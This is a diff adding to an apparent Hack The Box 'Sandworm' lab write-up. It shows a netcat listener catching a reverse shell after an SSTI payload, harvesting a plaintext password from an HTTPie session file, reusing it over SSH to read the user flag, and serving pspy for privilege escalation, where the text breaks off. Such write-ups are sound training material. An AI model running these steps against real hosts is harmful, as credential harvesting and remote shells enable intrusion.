@@ -139,6 +139,8 @@ Now we will change the vulnerable SSTI parameter to the following payload.
 ```
 ![](../assets/images/htb-writeup-Sandworm/fotoWeb11.PNG)
 
+And if everything has gone well, we have a reverse shell.
+
 ```ruby
 ❯ sudo nc -lvnp 4444
 listening on [any] 4444 ...
@@ -151,3 +153,68 @@ id
 uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
 atlas@sandworm:/var/www/html/SSA$ 
 ```
+
+**Privilege escalation**
+
+
+**Lateral movement (atlas -> silentobserver)**
+
+In the `.config` directory, there are two folders that we can only access since we don't have permissions for firejail.
+
+```ruby
+atlas@sandworm:~/.config$ ls  
+ls
+firejail
+httpie
+atlas@sandworm:~/.config$ cd firejail   
+cd firejail
+bash: cd: firejail: Permission denied
+```
+If we enter the directory `/.config/httpie/sessions/localhost_5000` we can see that there's a file with the `.json` extension containing what appears to be credentials for a user named `silentobserver`.
+
+```ruby
+atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ ls
+ls
+admin.json
+atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
+cat admin.json
+{
+    "__meta__": {
+        "about": "HTTPie session file",
+        "help": "https://httpie.io/docs#sessions",
+        "httpie": "2.6.0"
+    },
+    "auth": {
+        "password": "quietLiketheWind22",
+        "type": null,
+        "username": "silentobserver"
+    },
+    "cookies": {
+        "session": {
+            "expires": null,
+            "path": "/",
+            "secure": false,
+            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
+        }
+    },
+    "headers": {
+        "Accept": "application/json, */*;q=0.5"
+    }
+}
+```
+Now, let's try to see if we can connect via SSH to the user `silentobserver` with the password `quietLiketheWind22`.
+
+```ruby
+❯ ssh silentobserver@10.10.11.218
+silentobserver@10.10.11.218's password:
+silentobserver@sandworm:~$ cat user.txt 
+c091c7f4873edcc616a41df602813e21
+silentobserver@sandworm:~$ 
+```
+**Vertical Privilege Escalation**
+
+We deploy pspy to monitor the running tasks.
+
+`❯ python3 -m http.server 80`
+
+
